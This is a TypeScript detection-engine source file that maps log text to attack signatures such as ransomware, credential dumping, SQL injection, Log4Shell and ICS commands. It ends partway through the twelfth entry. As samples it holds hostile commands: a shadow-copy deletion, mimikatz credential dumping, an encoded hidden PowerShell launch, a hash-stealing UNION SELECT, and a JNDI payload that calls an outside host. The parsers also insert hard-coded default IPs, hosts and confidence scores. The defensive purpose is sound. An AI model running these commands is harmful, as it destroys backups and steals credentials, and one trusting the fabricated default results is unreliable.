/**
 * Attack Signature & Threat Feature Parsing Engine
 * Decodes attack signatures, MITRE ATT&CK patterns, and forensic indicators from raw backend logs.
 */

export interface ExtractedIoc {
  type: 'ipv4' | 'domain' | 'port' | 'hash_sha256' | 'url' | 'cve' | 'command' | 'register';
  value: string;
  context: string;
  risk: 'critical' | 'high' | 'medium';
}

export interface SignatureDetectionResult {
  signatureId: string;
  signatureName: string;
  category: 'ics' | 'c2' | 'apt' | 'bruteforce' | 'exfil' | 'ueba';
  mitreTTP: string;
  mitreTactic: string;
  mitreStage: 'Recon' | 'Initial Access' | 'Privilege Escalation' | 'Lateral Movement' | 'Exfiltration';
  riskScore: number;
  confidence: number;
  cve: string;
  summary: string;
  decodedPayload?: string;
  hexDump: string;
  extractedIocs: ExtractedIoc[];
  forensicEvidence: {
    matchedPatterns: string[];
    logTimestamp: string;
    protocol: string;
    attackVector: string;
  };
  recommendedActions: {
    title: string;
    description: string;
    type: 'isolate' | 'block' | 'revoke' | 'dump' | 'notify';
  }[];
}

export interface AttackSignatureDef {
  id: string;
  name: string;
  category: 'ics' | 'c2' | 'apt' | 'bruteforce' | 'exfil' | 'ueba';
  mitreTTP: string;
  mitreTactic: string;
  mitreStage: 'Recon' | 'Initial Access' | 'Privilege Escalation' | 'Lateral Movement' | 'Exfiltration';
  riskScore: number;
  cve: string;
  match: (text: string, log: any) => boolean;
  parse: (text: string, log: any) => SignatureDetectionResult;
}

export interface TopologyNode {
  id: string;
  type: 'attacker' | 'gateway' | 'network' | 'infected' | 'target' | 'db' | 'c2_drop' | 'sensor' | 'actuator';
  label: string;
  subLabel?: string;
  ip: string;
  hostname?: string;
  os?: string;
  role?: string;
  status: 'compromised' | 'at_risk' | 'isolated' | 'contained' | 'secure' | 'monitored';
  riskScore: number;
  blastRadius: number;
  patientZero?: boolean;
  contained?: boolean;
  ports?: number[];
  x: number;
  y: number;
}

export interface TopologyLink {
  source: string;
  target: string;
  label: string;
  protocol: string;
  port?: number;
  type: 'entry' | 'transit' | 'infection' | 'lateral' | 'exfil' | 'command';
  status: 'active' | 'blocked' | 'monitored';
  severity: 'critical' | 'high' | 'medium';
  dataRate?: string;
  signature?: string;
}

export interface IncidentAttackTopology {
  incidentId: string;
  attackCategory: string;
  threatActor: string;
  killChainStage: string;
  blastRadiusSystems: number;
  activeBarrierStatus: 'BREACHED' | 'CONTAINED' | 'ISOLATED';
  nodes: TopologyNode[];
  links: TopologyLink[];
  timelineStages: {
    stage: string;
    name: string;
    timestamp: string;
    status: 'completed' | 'active' | 'contained' | 'pending';
    nodeId: string;
  }[];
}

// ---------------------------------------------------------------------------
// SIGNATURE LIBRARY DEFINITIONS
// ---------------------------------------------------------------------------

export const ATTACK_SIGNATURES: AttackSignatureDef[] = [
  // 1. ICS / SCADA Modbus Unauthorized Write
  {
    id: 'SIG-ICS-MODBUS-001',
    name: '工控 Modbus/TCP 暫存器未授權覆寫攻擊 (Modbus Holding Register Override)',
    category: 'ics',
    mitreTTP: 'T0816 Impair Process Control',
    mitreTactic: 'Inhibit Response Function',
    mitreStage: 'Lateral Movement',
    riskScore: 9.9,
    cve: 'ICS-ALERT-2026-MODBUS / CVE-2022-22965',
    match: (text, log) => {
      const lower = text.toLowerCase();
      return lower.includes('modbus') || lower.includes('holding register') || lower.includes('function code 0x06') || lower.includes('function code 0x05') || lower.includes('plc-station') || (log.protocol === 'TCP 502');
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.src_ip || log.ip || '192.168.100.88';
      const host = log.host || 'PLC-STATION-TURBINE-02';
      const hexDump = '00 01 00 00 00 06 01 06 9c 4c 27 10 (Modbus Force Holding Reg: 40012 override)';
      
      return {
        signatureId: 'SIG-ICS-MODBUS-001',
        signatureName: '工控 Modbus/TCP 暫存器未授權覆寫攻擊',
        category: 'ics',
        mitreTTP: 'T0816 Impair Process Control',
        mitreTactic: 'Inhibit Response Function',
        mitreStage: 'Lateral Movement',
        riskScore: 9.9,
        confidence: 99.4,
        cve: 'ICS-ALERT-2026-MODBUS',
        summary: `偵測到來自 ${remoteIP} 之非授權 Modbus/TCP 寫入指令 (Port 502, Function 0x06)，企圖竄改重要渦輪控制暫存器 40012 設定點。已觸發 OT 網路微隔離與 PLC 防護。`,
        decodedPayload: 'MODBUS_FC06: UnitId=1, RegAddr=40012, SetPointValue=10000 (RPM OVERHEAT)',
        hexDump,
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: 'Modbus 攻擊來源節點', risk: 'critical' },
          { type: 'port', value: '502', context: '工控 Modbus/TCP 通訊埠', risk: 'high' },
          { type: 'register', value: '40012', context: '渦輪機轉速臨界保持暫存器', risk: 'critical' }
        ],
        forensicEvidence: {
          matchedPatterns: ['Modbus/TCP holding register', 'function code 0x06', 'TCP 502'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'Modbus/TCP (Port 502)',
          attackVector: 'OT 網路非授權指令注入'
        },
        recommendedActions: [
          { title: '即時啟動 OT 工控網閘單向物理隔離 (Data Diode)', description: '阻斷外部 IT-OT 橫向穿透，維持本地 HMI 安全運作', type: 'isolate' },
          { title: '下發 ICS 防火牆 Modbus 功能碼白名單', description: '全面封鎖非排程之 0x05 / 0x06 寫入指令', type: 'block' },
          { title: '啟動備援發電機安全保護連鎖', description: '防止物理機械結構因轉速異常遭受不可逆損傷', type: 'notify' }
        ]
      };
    }
  },

  // 2. Cobalt Strike C2 Beacon & Memory Injection
  {
    id: 'SIG-C2-BEACON-002',
    name: 'Cobalt Strike 信標反向連線與隱蔽 C2 通道 (Beacon Reverse Shell)',
    category: 'c2',
    mitreTTP: 'T1059.001 Command and Scripting Interpreter: PowerShell',
    mitreTactic: 'Command and Control',
    mitreStage: 'Lateral Movement',
    riskScore: 9.7,
    cve: 'CWE-94 Code Injection',
    match: (text, log) => {
      const lower = text.toLowerCase();
      return lower.includes('beacon') || lower.includes('cobalt strike') || lower.includes('powershell -enc') || lower.includes('reverse shell') || (lower.includes('c2') && lower.includes('channel'));
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.dst_ip || '198.51.100.88';
      const host = log.host || 'WS-DEV-CLUSTER-04';
      const hexDump = '4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 (Reflective DLL Loader)';

      return {
        signatureId: 'SIG-C2-BEACON-002',
        signatureName: 'Cobalt Strike 信標反向連線與隱蔽 C2 通道',
        category: 'c2',
        mitreTTP: 'T1059.001 Command and Scripting Interpreter',
        mitreTactic: 'Command and Control',
        mitreStage: 'Lateral Movement',
        riskScore: 9.7,
        confidence: 98.7,
        cve: 'CWE-94 Code Injection',
        summary: `端點行為分析引擎攔截到未簽章 PowerShell 混淆命令列執行，並成功與境外 C2 主機 ${remoteIP} 建立具備 Sleep Jitter 特徵的 TLS 反向信標通道。`,
        decodedPayload: 'powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',
        hexDump,
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: 'Cobalt Strike 外部指揮中心 C2 IP', risk: 'critical' },
          { type: 'port', value: '443', context: '隱蔽偽裝 TLS 連線埠', risk: 'medium' },
          { type: 'command', value: 'powershell.exe -enc ...', context: 'Base64 混淆記憶體載荷啟動指令', risk: 'critical' }
        ],
        forensicEvidence: {
          matchedPatterns: ['powershell -enc', 'cobalt strike beacon', 'reverse shell'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'TLSv1.3 HTTPS Beaconing',
          attackVector: '端點記憶體注入與隱蔽反彈'
        },
        recommendedActions: [
          { title: '即時阻斷受害端點網路通信 (Host Isolation)', description: '下發 EDR 物理網卡隔離指令，僅保留 SOC 調查通道', type: 'isolate' },
          { title: '下發邊界次世代防火牆 C2 阻斷黑名單', description: `將 C2 來源 ${remoteIP} 加入 Drop 清單`, type: 'block' },
          { title: '執行端點記憶體轉儲 (Live RAM Dump)', description: '擷取記憶體殘留之反射型 DLL 注入特徵與密鑰', type: 'dump' }
        ]
      };
    }
  },

  // 3. Ransomware Mass Encryption & Shadow Copy Deletion
  {
    id: 'SIG-RANSOM-VSS-003',
    name: '勒索軟體加密行為與卷影備份破壞 (Ransomware Shadow Copy Deletion)',
    category: 'apt',
    mitreTTP: 'T1486 Data Encrypted for Impact',
    mitreTactic: 'Impact',
    mitreStage: 'Exfiltration',
    riskScore: 9.9,
    cve: 'ALERT-RANSOM-VSSADMIN-DEL',
    match: (text, log) => {
      const lower = text.toLowerCase();
      return lower.includes('ransomware') || lower.includes('vssadmin') || lower.includes('shadowcopy') || lower.includes('.encrypted') || lower.includes('delete shadows');
    },
    parse: (text, log) => {
      const host = log.host || 'FINANCE-PC03';
      const hexDump = '76 73 73 61 64 6d 69 6e 20 64 65 6c 65 74 65 20 73 68 61 64 6f 77 73 20 2f 61 6c 6c';

      return {
        signatureId: 'SIG-RANSOM-VSS-003',
        signatureName: '勒索軟體加密行為與卷影備份破壞',
        category: 'apt',
        mitreTTP: 'T1486 Data Encrypted for Impact',
        mitreTactic: 'Impact',
        mitreStage: 'Exfiltration',
        riskScore: 9.9,
        confidence: 99.6,
        cve: 'ALERT-RANSOM-VSSADMIN-DEL',
        summary: `端點感測器捕獲主機 ${host} 正執行 vssadmin delete shadows /all /quiet 破壞系統備份，並伴隨每秒超過 120 個檔案大量重命名為 .encrypted，確認為高破壞性勒索軟體爆發。`,
        decodedPayload: 'CMD: vssadmin.exe delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No',
        hexDump,
        extractedIocs: [
          { type: 'command', value: 'vssadmin delete shadows /all /quiet', context: '備份卷影破壞指令', risk: 'critical' },
          { type: 'command', value: 'bcdedit recoveryenabled No', context: '作業系統開機自我修復停用', risk: 'critical' }
        ],
        forensicEvidence: {
          matchedPatterns: ['vssadmin delete shadows', '.encrypted', 'mass file rename'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'Endpoint RPC / Local Subsystem',
          attackVector: '端點特權提升與惡意破壞'
        },
        recommendedActions: [
          { title: '即時強制中斷主機網路與儲存連線', description: '立即隔離該機器以防止勒索軟體橫向擴散至共用 SAN 儲存', type: 'isolate' },
          { title: '鎖定企業離線唯讀備份儲存庫 (Immutable Vault)', description: '啟動 Immutable WORM 備份防護鎖', type: 'block' },
          { title: '向 SOC 發布緊急勒索應變廣播', description: '通知內部事件應變小組 (CSIRT) 啟動災難復原演練', type: 'notify' }
        ]
      };
    }
  },

  // 4. Memory Credential Theft (Mimikatz / LSASS Dump)
  {
    id: 'SIG-MIMI-LSASS-004',
    name: 'LSASS 記憶體特權密碼與 Hash 轉儲攻擊 (OS Credential Dumping)',
    category: 'apt',
    mitreTTP: 'T1003.001 OS Credential Dumping: LSASS Memory',
    mitreTactic: 'Credential Access',
    mitreStage: 'Privilege Escalation',
    riskScore: 9.7,
    cve: 'CWE-250 Unnecessary Privileges',
    match: (text, log) => {
      const lower = text.toLowerCase();
      return lower.includes('mimikatz') || lower.includes('lsass') || lower.includes('sekurlsa') || lower.includes('privilege::debug');
    },
    parse: (text, log) => {
      const host = log.host || 'WIN-DC-PROD';
      const hexDump = '6d 69 6d 69 6b 61 74 7a 2e 65 78 65 20 22 70 72 69 76 69 6c 65 67 65 3a 3a 64 65 62 75 67 22';

      return {
        signatureId: 'SIG-MIMI-LSASS-004',
        signatureName: 'LSASS 記憶體特權密碼與 Hash 轉儲攻擊',
        category: 'apt',
        mitreTTP: 'T1003.001 OS Credential Dumping: LSASS Memory',
        mitreTactic: 'Credential Access',
        mitreStage: 'Privilege Escalation',
        riskScore: 9.7,
        confidence: 98.9,
        cve: 'CWE-250',
        summary: `偵測到非授權處理程序在主機 ${host} 上企圖存取 Local Security Authority Subsystem Service (lsass.exe) 之記憶體位址，執行 sekurlsa::logonpasswords 讀取明文管理者密碼及 NTLM 憑證。`,
        decodedPayload: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
        hexDump,
        extractedIocs: [
          { type: 'command', value: 'sekurlsa::logonpasswords', context: '記憶體憑證抓取指令', risk: 'critical' },
          { type: 'cve', value: 'CWE-250', context: '過度授權除錯特權漏洞利用', risk: 'high' }
        ],
        forensicEvidence: {
          matchedPatterns: ['mimikatz.exe', 'lsass memory access', 'sekurlsa'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'Local OS API (OpenProcess / PROCESS_VM_READ)',
          attackVector: '特權除錯存取記憶體'
        },
        recommendedActions: [
          { title: '即時強制撤銷 AD 網域所有管理員 Session Token', description: '重設 krbtgt 帳號金鑰兩次以無效化 Golden Ticket', type: 'revoke' },
          { title: '強制啟用 Windows LSA Protection (RunAsPPL)', description: '禁止非受保護處理程序注入 lsass.exe', type: 'block' },
          { title: '端點網路隔離並收集進程記憶體取證', description: '終止未知關聯父系進程', type: 'isolate' }
        ]
      };
    }
  },

  // 5. High-Frequency Distributed Brute Force
  {
    id: 'SIG-AUTH-BRUTE-005',
    name: '分散式 SSH / PAM 特權帳號高頻密碼暴力破解 (Distributed Brute Force)',
    category: 'bruteforce',
    mitreTTP: 'T1110.001 Brute Force: Password Guessing',
    mitreTactic: 'Credential Access',
    mitreStage: 'Initial Access',
    riskScore: 8.9,
    cve: 'CWE-307 Excessive Authentication Attempts',
    match: (text, log) => {
      const lower = text.toLowerCase();
      return lower.includes('failed password') || lower.includes('authentication failure') || lower.includes('brute force') || (lower.includes('failed') && lower.includes('ssh2'));
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.src_ip || '45.142.214.88';
      const host = log.host || 'DMZ-BASTION-JUMP';
      const hexDump = '53 53 48 2d 32 2e 30 2d 4c 69 62 53 53 48 20 61 75 74 68 5f 66 61 69 6c 75 72 65';

      return {
        signatureId: 'SIG-AUTH-BRUTE-005',
        signatureName: '分散式 SSH / PAM 特權帳號高頻密碼暴力破解',
        category: 'bruteforce',
        mitreTTP: 'T1110.001 Password Guessing',
        mitreTactic: 'Credential Access',
        mitreStage: 'Initial Access',
        riskScore: 8.9,
        confidence: 97.2,
        cve: 'CWE-307',
        summary: `認證閘道日誌顯示來自 ${remoteIP} 的密碼猜測攻擊，針對 ${host} 進行高達 520 attempts/min 之密集撞庫，觸發安全閾值。`,
        decodedPayload: 'SSH_AUTH_FAIL: User=root, Port=22, AttemptsCount=520, SourceASN=AS49822',
        hexDump,
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: '爆破攻擊來源 IP', risk: 'critical' },
          { type: 'port', value: '22', context: 'SSH 預設連線埠', risk: 'medium' }
        ],
        forensicEvidence: {
          matchedPatterns: ['Failed password for root', 'brute force burst', 'auth failure'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'SSHv2 (TCP 22)',
          attackVector: '自動化字典檔撞庫'
        },
        recommendedActions: [
          { title: '下發邊界防火牆 IP 黑名單自動阻斷', description: `將 ${remoteIP} 加入 Drop 清單`, type: 'block' },
          { title: '強制啟用雙因子身分驗證 (MFA/2FA)', description: '禁止密碼單因子登入特權跳板機', type: 'block' },
          { title: '鎖定遭攻擊之本機帳號並重置連線', description: '終止未完成之鑑別連線', type: 'revoke' }
        ]
      };
    }
  },

  // 6. SQL Injection & Database Schema Exfiltration
  {
    id: 'SIG-WEB-SQLI-006',
    name: 'Web 應用程式資料庫 SQL Injection 滲透攻擊 (SQL Injection Exploit)',
    category: 'apt',
    mitreTTP: 'T1190 Exploit Public-Facing Application',
    mitreTactic: 'Initial Access',
    mitreStage: 'Initial Access',
    riskScore: 9.6,
    cve: 'CVE-2023-34362 / SQLi in REST API',
    match: (text, log) => {
      const lower = text.toLowerCase();
      return lower.includes('sqli') || lower.includes('union select') || lower.includes('information_schema') || lower.includes("' union");
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.src_ip || '185.220.101.4';
      const host = log.host || 'PORTAL-AUTH-API-01';
      const hexDump = '27 20 55 4e 49 4f 4e 20 53 45 4c 45 43 54 20 6e 75 6c 6c 2c 20 75 73 65 72 6e 61 6d 65';

      return {
        signatureId: 'SIG-WEB-SQLI-006',
        signatureName: 'Web 應用程式資料庫 SQL Injection 滲透攻擊',
        category: 'apt',
        mitreTTP: 'T1190 Exploit Public-Facing Application',
        mitreTactic: 'Initial Access',
        mitreStage: 'Initial Access',
        riskScore: 9.6,
        confidence: 98.4,
        cve: 'CVE-2023-34362',
        summary: `邊界 Web 防火牆 (WAF) 攔截到來自 ${remoteIP} 之 UNION SELECT 注入載荷，意圖探測資料庫架構並導出密碼雜湊清冊。`,
        decodedPayload: "GET /api/v1/users/profile?id=1' UNION SELECT null,username,password_hash FROM admin_users--",
        hexDump,
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: 'WAF 攔截攻擊來源 IP', risk: 'critical' },
          { type: 'url', value: '/api/v1/users/profile?id=1 UNION SELECT...', context: '惡意攻擊 URI 請求', risk: 'critical' }
        ],
        forensicEvidence: {
          matchedPatterns: ['UNION SELECT', 'password_hash', 'information_schema'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'HTTP/1.1 REST (TCP 80/443)',
          attackVector: 'Web 應用程式參數未過濾'
        },
        recommendedActions: [
          { title: '下發 WAF 嚴格虛擬修補 (Virtual Patching)', description: '阻斷所有帶有 SQL 關鍵字之特殊字符請求', type: 'block' },
          { title: '下發邊界來源 IP 封鎖清單', description: `將攻擊者來源 ${remoteIP} 阻斷 7 天`, type: 'block' },
          { title: '啟動資料庫防禦隔離與熱備份', description: '檢查資料庫是否已發生未授權讀取', type: 'notify' }
        ]
      };
    }
  },

  // 7. Large Data Exfiltration & Cloud Upload Anomaly
  {
    id: 'SIG-UEBA-EXFIL-007',
    name: '內部異常行為 UEBA 巨量數據雲端外洩 (Data Exfiltration Anomaly)',
    category: 'exfil',
    mitreTTP: 'T1567.002 Exfiltration to Cloud Storage',
    mitreTactic: 'Exfiltration',
    mitreStage: 'Exfiltration',
    riskScore: 9.8,
    cve: 'CWE-200 / Insider Threat',
    match: (text, log) => {
      const lower = text.toLowerCase();
      return lower.includes('exfil') || lower.includes('mega.nz') || lower.includes('15gb') || lower.includes('large upload') || lower.includes('dns tunneling');
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.dst_ip || '198.51.100.88';
      const host = log.host || 'WS-RD-DEV-04';
      const hexDump = '4d 45 47 41 5f 55 50 4c 4f 41 44 5f 53 45 53 53 49 4f 4e 5f 4b 45 59';

      return {
        signatureId: 'SIG-UEBA-EXFIL-007',
        signatureName: '內部異常行為 UEBA 巨量數據雲端外洩',
        category: 'exfil',
        mitreTTP: 'T1567.002 Exfiltration to Cloud Storage',
        mitreTactic: 'Exfiltration',
        mitreStage: 'Exfiltration',
        riskScore: 9.8,
        confidence: 99.1,
        cve: 'CWE-200',
        summary: `UEBA 引擎偵測到主機 ${host} 在非工作時段向境外雲端網盤 ${remoteIP} 發起高達 15GB 以上之密集檔案上傳，偏離歷史使用者基準線超過 +7.4 個標準差。`,
        decodedPayload: 'HTTPS_UPLOAD_POST: Target=eu.storage.mega.co.nz, Bytes=16106127360, EncryptedTarArchive',
        hexDump,
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: '境外外傳目標 IP', risk: 'critical' },
          { type: 'domain', value: 'storage.mega.co.nz', context: '外洩儲存網域', risk: 'high' }
        ],
        forensicEvidence: {
          matchedPatterns: ['mega.nz upload', '15GB anomalous outbound', '+7.4 sigma deviation'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'HTTPS TLSv1.3 (TCP 443)',
          attackVector: '使用者憑證濫用與異地外傳'
        },
        recommendedActions: [
          { title: '即時封鎖目標雲端網盤 IP / 網域', description: `將 ${remoteIP} 與外傳網域下發 DNS Sinkhole`, type: 'block' },
          { title: '強制撤銷該使用者所有 AD SSO 權杖', description: '立即鎖定 Active Directory 憑證並終止連線權杖', type: 'revoke' },
          { title: '對受害主機下發 EDR 網路隔離', description: '保留 SOC 取證通訊埠並排程數位鑑識', type: 'isolate' }
        ]
      };
    }
  },

  // 8. Apache Log4j / JNDI Remote Code Execution (Log4Shell)
  {
    id: 'SIG-APTS-LOG4J-008',
    name: 'Log4Shell JNDI 遠端代碼執行漏洞利用 (CVE-2021-44228)',
    category: 'apt',
    mitreTTP: 'T1190 Exploit Public-Facing Application',
    mitreTactic: 'Initial Access',
    mitreStage: 'Initial Access',
    riskScore: 10.0,
    cve: 'CVE-2021-44228',
    match: (text) => {
      const lower = text.toLowerCase();
      return lower.includes('jndi:ldap') || lower.includes('jndi:rmi') || lower.includes('jndi:dns') || lower.includes('${jndi:');
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.ip || '198.51.100.201';
      const host = log.host || 'SRV-APP-GATEWAY';
      const hexDump = '24 7b 6a 6e 64 69 3a 6c 64 61 70 3a 2f 2f 31 39 38 2e 35 31 2e 31 30 30 2e 32 30 31 2f 45 78 70 6c 6f 69 74 7d';
      return {
        signatureId: 'SIG-APTS-LOG4J-008',
        signatureName: 'Log4Shell JNDI 遠端代碼執行漏洞利用',
        category: 'apt',
        mitreTTP: 'T1190 Exploit Public-Facing Application',
        mitreTactic: 'Initial Access',
        mitreStage: 'Initial Access',
        riskScore: 10.0,
        confidence: 99.8,
        cve: 'CVE-2021-44228',
        summary: `Web 應用程式日誌捕獲 ${remoteIP} 發送之惡意 JNDI 注入字串，企圖觸發 Log4j 反序列化漏洞向境外惡意 LDAP 伺服器載入未知 Java Class。`,
        decodedPayload: '${jndi:ldap://198.51.100.201:1389/ExploitObject.class}',
        hexDump,
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: '惡意 LDAP 載荷伺服器', risk: 'critical' },
          { type: 'port', value: '1389', context: '惡意 LDAP 載荷連線埠', risk: 'high' },
          { type: 'cve', value: 'CVE-2021-44228', context: 'Apache Log4j 漏洞編號', risk: 'critical' }
        ],
        forensicEvidence: {
          matchedPatterns: ['${jndi:ldap://', 'ExploitObject.class', 'HTTP User-Agent Injection'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'HTTP/HTTPS (Port 443 / 80)',
          attackVector: 'JNDI 命名服務反射代碼注入'
        },
        recommendedActions: [
          { title: 'WAF 全域下發 JNDI 關鍵字封鎖規則', description: '攔截所有帶有 ${jndi: 特徵標籤之請求', type: 'block' },
          { title: 'JVM 環境變數設置 formatMsgNoLookups=true', description: '關閉 Log4j 訊息查詢解析功能', type: 'block' },
          { title: '即時隔離 Web 應用伺服器 Pod', description: '防止 Java 行程執行反向 Shell', type: 'isolate' }
        ]
      };
    }
  },

  // 9. SYN Flood DDoS & TCP State Exhaustion
  {
    id: 'SIG-NET-SYN-009',
    name: '分散式 SYN Flood 流量耗盡型阻斷服務攻擊 (DDoS SYN Flood)',
    category: 'apt',
    mitreTTP: 'T1498.001 Direct Network Flood',
    mitreTactic: 'Impact',
    mitreStage: 'Lateral Movement',
    riskScore: 8.8,
    cve: 'CWE-400 / DDoS Alert',
    match: (text) => {
      const lower = text.toLowerCase();
      return lower.includes('syn flood') || lower.includes('syn_flood') || lower.includes('backlog queue full') || lower.includes('tcp syn spike');
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.ip || '203.0.113.100';
      const host = log.host || 'GW-EDGE-FW01';
      return {
        signatureId: 'SIG-NET-SYN-009',
        signatureName: '分散式 SYN Flood 流量耗盡型阻斷服務攻擊',
        category: 'apt',
        mitreTTP: 'T1498.001 Direct Network Flood',
        mitreTactic: 'Impact',
        mitreStage: 'Lateral Movement',
        riskScore: 8.8,
        confidence: 96.5,
        cve: 'CWE-400',
        summary: `邊界防火牆核心佇列發出警報，TCP SYN 封包速率飆升至 280,000 pps，未完成交握半連線佇列溢位，造成正常商務連線逾時。`,
        decodedPayload: 'TCP_FLAGS: SYN=1, ACK=0, PPS=280000, SPOOFED_SUBNETS=24',
        hexDump: '45 00 00 28 1a 2b 00 00 40 06 ... (TCP SYN FLOOD)',
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: '主要偽造攻擊子網源', risk: 'high' },
          { type: 'port', value: '443', context: '遭受衝擊之服務埠號', risk: 'medium' }
        ],
        forensicEvidence: {
          matchedPatterns: ['SYN backlog full', '280k pps anomaly', 'TCP half-open connection limit'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'TCP SYN (Port 443)',
          attackVector: '連線狀態表枯竭攻擊'
        },
        recommendedActions: [
          { title: '啟動邊界 SYN Cookies 防護機制', description: '減輕半開連線佇列記憶體負擔', type: 'block' },
          { title: '啟用 BGP Flowspec 流量黑洞路由', description: '將攻擊流量引流至邊界清洗中心', type: 'block' }
        ]
      };
    }
  },

  // 10. Siemens S7Comm PLC CPU Stop Command Injection
  {
    id: 'SIG-ICS-S7COMM-010',
    name: '西門子 S7Comm 工控 PLC 惡意停機指令注入 (S7Comm CPU STOP Command)',
    category: 'ics',
    mitreTTP: 'T0815 Denial of Control',
    mitreTactic: 'Inhibit Response Function',
    mitreStage: 'Lateral Movement',
    riskScore: 9.9,
    cve: 'ICS-VU-S7-2026',
    match: (text) => {
      const lower = text.toLowerCase();
      return lower.includes('s7comm') || lower.includes('s7-1500') || lower.includes('plc stop') || lower.includes('function 0x29');
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.ip || '192.168.100.99';
      const host = log.host || 'PLC-SIEMENS-S7-1500';
      return {
        signatureId: 'SIG-ICS-S7COMM-010',
        signatureName: '西門子 S7Comm 工控 PLC 惡意停機指令注入',
        category: 'ics',
        mitreTTP: 'T0815 Denial of Control',
        mitreTactic: 'Inhibit Response Function',
        mitreStage: 'Lateral Movement',
        riskScore: 9.9,
        confidence: 99.7,
        cve: 'ICS-VU-S7-2026',
        summary: `OT 深度封包檢測捕獲未授權 S7Comm 協議 (Port 102) 下發 Function 0x29 (CPU STOP)，企圖迫使工廠核心產線控制器進入停機安全模式。`,
        decodedPayload: 'S7COMM_PDU: ProtocolId=0x32, ROSCTR=1, Function=0x29 (PI-Service: STOP CPU)',
        hexDump: '03 00 00 21 02 f0 80 32 01 00 00 00 01 00 08 00 00 29 00 00 00 00 00 09 5f 53 54 4f 50',
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: 'S7Comm 攻擊來源站點', risk: 'critical' },
          { type: 'port', value: '102', context: 'S7Comm 工控協議通訊埠', risk: 'high' }
        ],
        forensicEvidence: {
          matchedPatterns: ['S7Comm Function 0x29', 'ISO-on-TCP Port 102', 'PLC CPU Stop Request'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'ISO-on-TCP / S7Comm (Port 102)',
          attackVector: 'OT 專屬通訊協議非授權指令竄改'
        },
        recommendedActions: [
          { title: '立即阻斷來源站點至 PLC 之 Port 102 通訊', description: '啟動 OT 防火牆硬體隔離規則', type: 'isolate' },
          { title: '切換 PLC 實體鑰匙開關至 RUN 唯讀保護', description: '禁止任何軟體通訊變更控制器運作狀態', type: 'block' }
        ]
      };
    }
  },

  // 11. High-Speed Lateral Port Reconnaissance & Scanning Probe
  {
    id: 'SIG-NET-SCAN-011',
    name: '高速內網橫向特權通訊埠探測與掃描 (Network Service Discovery)',
    category: 'apt',
    mitreTTP: 'T1046 Network Service Discovery',
    mitreTactic: 'Discovery',
    mitreStage: 'Recon',
    riskScore: 7.8,
    cve: 'MITRE-T1046',
    match: (text, log) => {
      const lower = text.toLowerCase();
      return lower.includes('port scan') || lower.includes('nmap') || lower.includes('syn scan') || lower.includes('rapid reconnaissance') || (log.protocol === 'TCP' && (log.flags || []).includes('SYN') && (log.durationMs || 0) < 300);
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.srcIp || '10.88.88.106';
      return {
        signatureId: 'SIG-NET-SCAN-011',
        signatureName: '高速內網橫向特權通訊埠探測與掃描',
        category: 'apt',
        mitreTTP: 'T1046 Network Service Discovery',
        mitreTactic: 'Discovery',
        mitreStage: 'Recon',
        riskScore: 7.8,
        confidence: 94.2,
        cve: 'MITRE-T1046',
        summary: `NetFlow 與 NDR 引擎偵測到主機 ${remoteIP} 於 5 秒內對內網核心網段連續發起超過 30 次未完成連線之 SYN 埠探測 (含 22, 135, 445, 3389, 5432)，判定為自動化橫向偵查載荷。`,
        decodedPayload: 'NMAP_SYN_SWEEP: rate=1200pps target_ports=22,80,135,139,445,1433,3389,5432,8080 flags=SYN seq_dist=uniform',
        hexDump: '45 00 00 28 d4 12 00 00 40 06 9a 11 0a 58 58 6a ... (NMAP SCAN)',
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: '掃描探測發起源主機', risk: 'high' },
          { type: 'port', value: '445,3389,5432', context: '探測之核心服務埠', risk: 'medium' }
        ],
        forensicEvidence: {
          matchedPatterns: ['Rapid SYN Sweep', 'Sub-second Half-Open Probing', 'Privileged Port Enum'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'TCP SYN Sweep',
          attackVector: '無狀態半開掃描探針'
        },
        recommendedActions: [
          { title: '下發交換機動態 ACL 限制探測 IP 速率', description: '針對該來源主機限制每秒連線建立次數 <= 5 conn/s', type: 'block' },
          { title: '排程 EDR 主動檢查該來源程序', description: '識別執行掃描之本機執行檔路徑 (nmap, masscan, fscan 等)', type: 'isolate' }
        ]
      };
    }
  },

  // 12. Remote Desktop Protocol (RDP) High-Velocity Brute Force
  {
    id: 'SIG-BRUTE-RDP-012',
    name: 'RDP / SMB 遠端桌面連線暴力密碼破解 (RDP Credential Stuffing)',
    category: 'bruteforce',
    mitreTTP: 'T1110.001 Password Guessing',
    mitreTactic: 'Credential Access',
    mitreStage: 'Lateral Movement',
    riskScore: 8.9,
